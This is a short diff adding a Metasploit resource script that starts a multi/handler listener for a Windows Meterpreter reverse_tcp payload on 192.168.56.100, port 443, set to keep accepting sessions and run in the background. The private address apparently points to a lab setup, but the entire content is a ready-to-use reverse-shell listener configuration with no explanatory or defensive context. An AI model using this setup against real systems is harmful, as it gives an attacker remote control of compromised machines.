@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.56.100
+set lport 443
+set EXITONSESSION FALSE
+exploit -j -z
